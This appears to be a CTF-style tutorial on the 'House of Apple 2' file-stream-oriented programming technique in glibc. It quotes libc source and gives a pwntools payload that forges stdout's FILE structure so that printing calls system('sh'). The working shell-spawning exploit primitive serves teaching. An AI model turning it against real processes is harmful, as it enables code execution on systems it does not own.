# FSOP

There are many ways to perform an fsop, the modern and most reliable way is to use the ``House of apple 2``.

## What do we need?
* A libc leak
* The possibility to write inside of a file struct (e.g. ``_IO_2_1_stdout_`` inside libc)

## How it works
```python
fs = FileStructure()
fs.flags = b' sh\0\0\0\0\0'
fs._lock = libc.sym._IO_stdfile_1_lock
fs._wide_data = libc.sym._IO_2_1_stdout_ - 0x10
fs.unknown2 = p64(0)*4 + p64(libc.sym.system) + p64(libc.sym._IO_2_1_stdout_ + 0x60)
fs.vtable = libc.sym._IO_wfile_jumps - 0x20
```

To perform an FSOP, we need to overwrite the contents of a ``_IO_FILE`` struct (more precisely, a ``_IO_FILE_plus`` struct) in order to pop a **shell** (or more simply gain **arbitrary read/write**). In this explanation we'll go for the shell.

### File structs

A ``_IO_FILE_plus`` struct is composed of a ``_IO_FILE`` struct and a ``_IO_jump_t`` **vtable** pointer.
```c
// https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/libioP.h#L326
struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
};
```

This ``_IO_FILE_plus`` struct contains many fields which are thoroughly explained in the slides, what we care about now is the ``vtable``. This vtable contains many function pointers that get called by libc functions. It is also sadly **protected** from being pivoted to a maliciously crafted one since **glibc 2.24**, so our attack will not focus on overwriting the vtable ptr to a vtable of ours.

### Vtable check
```c
// https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/libioP.h#L1033
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) &__io_vtables;
  if (__glibc_unlikely (offset >= IO_VTABLES_LEN))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```

The check is performed to make sure the vtable pointer is not in an unexpected section. This check is performed on every ``_IO_FILE_plus`` struct vtable pointer.

By looking at this code more carefully, we can see that the vtable **must be inside** the ``__io_vtables`` array, but no check is performed on wheter the **offset** of the pointer is right or not.

It's also important to note that this check, as already said, is performed on ``_IO_FILE_plus`` vtable pointers, but **not** on ``_wide_vtable`` pointers inside of ``_IO_wide_data`` structs.

### The attack

Since the ``_wide_vtable`` pointer is not checked by glibc, our objectibe will be to **overwrite this pointer to a vtable of ours**.

To do that, we need to be able to write inside of a file struct, in this case ``_IO_2_1_stdout_``. We first need to overwrite our ``_wide_data`` pointer to an area we control. To make the exploit more compact, we choose ``_IO_2_1_stdout - 0x10`` itself. By doing that, once glibc will look for the ``_wide_vtable`` pointer, it will do this: ```_IO_2_1_stdout_->_IO_2_1_stdout-0x10->_IO_2_1_stdout_+0xd0``` instead of ```_IO_2_1_stdout_->_wide_data->_wide_vtable```.

Then, we'll have to insert a pointer to a fake vtable inside ``_IO_2_1_stdout_+0xd0``. We don't actually need to fake a whole vtable, we just need to insert the pointer to the function we want to call at the offset of the function that would normally be called. Our aim is to insert the pointer to ``system`` at the same offset as ``doallocate``, because this function will be called with ``&_IO_FILE_plus->flags`` as the first parameter.

```c
// https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/libioP.h#L295
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```

The ``__doallocate`` function is called when a IO function (like printf) wants to print something to this file but the write buffer is full or not yet initialized. ``__doallocate`` is at **0x68** bytes from the start of the ``_IO_jump_t`` struct.

To not mess up any of the ``_IO_FILE_plus`` contents, we'll have to write inside the area that pwntools calls ``unknown2``, which is at **0xA8** bytes from the start of the the struct. With this said, we'll write ``_IO_2_1_stdout_ + 0x60`` at ``_IO_2_1_stdout_ + 0xd0`` and also a pointer to ``system`` at ``_IO_2_1_stdout_ + 0xc8``. By doing this, when ``__doallocate`` gets called, **system** answers instead. This is the flow that the pointers follow:

#### Normally
 ```_IO_2_1_stdout_->_wide_data->_wide_vtable->__doallocate```

#### Now 
```_IO_2_1_stdout_->_IO_2_1_stdout_-0x10->_IO_2_1_stdout_+0xd0->_IO_2_1_stdout_+0xc8```

Great, but how do we trigger ``__doallocate``? 
As i said, it is triggered when the write buffer is full or not yet initialized,  but in the example program (and in many cases) we cannot make the buffer full or overwrite ``_IO_2_1_stdout_`` before any prints, so what can we do? We'll have to force it being called.

The function that calls ``__doallocate`` with ``&flags`` as **rdi** is ``__overflow``.
```c
// https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/wfileops.c#L406
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0
      || f->_wide_data->_IO_write_base == NULL)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == NULL)
	{
	  _IO_wdoallocbuf (f);
	  _IO_free_wbackup_area (f);

	  if (f->_IO_write_base == NULL)
	    {
	      _IO_doallocbuf (f);
	      _IO_setg (f, f->_IO_buf_base, f->_IO_buf_base, f->_IO_buf_base);
	    }
	  _IO_wsetg (f, f->_wide_data->_IO_buf_base,
		     f->_wide_data->_IO_buf_base, f->_wide_data->_IO_buf_base);
	}
    // continues...
```
``__doallocate`` is called if the stream is not yet in writing ("putting") mode or if ``_IO_write_base`` is ``NULL``. So, if we overwrite the ``_IO_write_base`` with ``NULL`` and then call ``__overflow``, ``__doallocate`` will be called indirectly. But since we want to use the ``_wide_vtable``, we'll also have to trigger its ``__overflow`` function, not the standard one.

To achieve this, we'll overwrite the ``vtable`` pointer in the ``_IO_FILE_plus`` struct with the ``_wide_vtable`` minus an offset. The offset will have to be the one from ``__overflow`` (at 0x18) to ``__xsputn`` (at 0x38), which is **0x20**. ``__xsputn`` is called every time an IO function prints something to this stream, so by writing ``_IO_wfile_jumps - 0x20`` to the ``vtable`` address, when a standard characted (non unicode aka wide) is printed, ``__overflow`` gets called instead of ``__xsputn``, thus triggering ``__doallocate`` which is actually ``system``.

#### Important
The ``vtable`` pointer in the ``_IO_FILE_plus`` struct gets overwritten with a ``_wide_vtable`` (``_IO_wfile_jumps``), so it calls the functions defined inside the ``_wide_vtable`` pointer saved in ``_wide_data``.

Since ``__doallocate`` contains the address of the ``_IO_FILE_plus`` struct in **rdi**, if we put `` sh\0\0\0\0\0`` in ``flags``, we'll successfully call ``system`` with ``sh`` as its argument.

## Notes
Check also the ``glibc_io_structs.md`` and the ``solve.py`` files.

## Usefull links
https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/libioP.h#L295
https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/bits/types/struct_FILE.h#L51
https://elixir.bootlin.com/glibc/glibc-2.42/source/libio/libio.h#L121
